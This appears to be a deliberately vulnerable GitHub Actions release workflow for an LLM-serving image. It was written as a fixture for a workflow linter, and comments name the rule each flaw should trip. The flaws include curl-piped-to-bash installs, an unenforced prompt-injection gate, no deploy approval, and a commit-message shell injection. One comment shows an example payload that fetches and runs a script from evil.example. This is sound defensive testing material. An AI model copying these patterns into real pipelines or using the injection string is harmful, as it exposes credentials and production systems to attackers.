@@ -1,0 +1,57 @@
+# VULNERABLE release workflow for the model-serving image. For READING and LINTING only.
+# Every "VULN" names the workflow_lint.py rule that must catch it.
+name: release-model-server
+
+on:
+  push:
+    branches: [main]
+
+# VULN (GHA-002): no `permissions:` block. GITHUB_TOKEN gets the repository default,
+# which on many older repos and orgs is read/write to everything.
+
+jobs:
+  # VULN (GHA-010): deploys to production with no protected environment (no human approval).
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      # VULN (GHA-001, GHA-008): mutable tag; the token stays in .git/config for later steps.
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install tools and dependencies
+        # VULN (GHA-007): runs whatever the server returns today.
+        run: |
+          curl -sSL https://install.tool.example/setup.sh | bash
+          pip install -r requirements.txt
+
+      - name: Unit tests
+        run: pytest -q
+
+      # VULN (GHA-006): the AI security gate cannot block anything.
+      - name: Prompt-injection regression suite
+        run: pytest -q 02-llm-security/prompt-injection
+        continue-on-error: true   # "it was flaky after the model upgrade"
+
+      - name: Build and push image
+        uses: docker/build-push-action@v6
+        with:
+          push: true
+          tags: ghcr.io/acme/support-llm:latest
+
+      # VULN (GHA-005): long-lived AWS keys stored as repository secrets.
+      - name: Configure AWS
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          aws-region: eu-west-1
+
+      # VULN (GHA-004): the commit message is pasted into a shell script. A commit message like
+      #   fix"; curl https://evil.example/x | sh; echo "
+      # becomes code that runs with the AWS credentials above.
+      - name: Deploy
+        run: ./scripts/deploy.sh "${{ github.event.head_commit.message }}"
+
+# VULN (GHA-009): no secret scan, SAST, dependency audit, model scan, SBOM or signing stage.
